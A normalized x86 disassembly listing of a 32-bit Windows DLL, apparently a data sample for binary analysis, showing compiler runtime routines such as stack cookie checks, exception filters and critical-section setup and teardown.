push [ ebp - 0x14 ]
call sub_1001d012
pop ecx
retn
sub_1001d121
call sub_1000e343
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1000e343
add eax 0x90
dec [ eax ]
sub_1001d1c4
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1001d1cd
mov esp [ ebp - 0x18 ]
call sub_100195c2
sub_1001d27a
push 0x4
mov eax sub_10020f1a
call sub_1001ce3f
call sub_1000e343
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_100195fb
call sub_1001960e
sub_1001d353
mov eax [ ebp - 0x14 ]
call sub_1001d13c
retn
sub_1001d5ca
xor eax eax
inc eax
retn
sub_1001d5ce
mov esp [ ebp - 0x18 ]
call sub_100195c2
sub_1001d663
xor eax eax
inc eax
retn
sub_1001d667
mov esp [ ebp - 0x18 ]
call sub_100195c2
sub_1001db19
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10012212
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001ddbf
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001dd7d
add esp 0x10
pop ebp
retn
sub_1001ddf8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1001dc6c
pop ecx
pop ecx
pop ebp
retn
sub_1001de0b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1001dcdf
pop ecx
pop ecx
pop ebp
retn
sub_1001e7d9
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_10020dc7
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_10020e0c
mov ecx [ ebp + 0x8 ]
add ecx 0x88
jmp sub_100091f5
sub_10020e1a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1000ac69
mov eax r--data
jmp sub_1001cab3
sub_10020e35
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_100091f5
sub_10020e40
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1000ac69
mov eax r--data
jmp sub_1001cab3
sub_10020e5b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1000ac69
mov eax r--data
jmp sub_1001cab3
sub_10020e76
push [ ebp - 0x10 ]
call sub_1000b6da
pop ecx
retn
sub_10020e80
push [ ebp - 0x10 ]
call sub_1000b6da
pop ecx
retn
sub_10020e8a
push [ ebp - 0x10 ]
call sub_1000b6da
pop ecx
retn
sub_10020e94
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1000ac69
mov eax r--data
jmp sub_1001cab3
sub_10020eaf
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_100091f5
sub_10020eba
push [ ebp - 0x10 ]
call sub_1000b6da
pop ecx
retn
sub_10020ec4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1000ac69
mov eax r--data
jmp sub_1001cab3
sub_10020edf
push [ ebp - 0x201c ]
call sub_1000b6da
pop ecx
retn
sub_10020eec
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2024 ]
mov ecx [ edx - 0x2028 ]
xor ecx eax
call sub_1000ac69
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000ac69
mov eax r--data
jmp sub_1001cab3
sub_10020f1a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1000ac69
mov eax r--data
jmp sub_1001cab3
sub_10020f35
push rw-data
call [ InitializeCriticalSection@IAT ]
push sub_10020f92
call sub_1000b5e1
pop ecx
retn
sub_10020f92
push rw-data
call [ DeleteCriticalSection@IAT ]
jmp sub_100045c2
sub_10020fa2
push rw-data
call [ DeleteCriticalSection@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
retn
sub_10020fba
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_1001226f
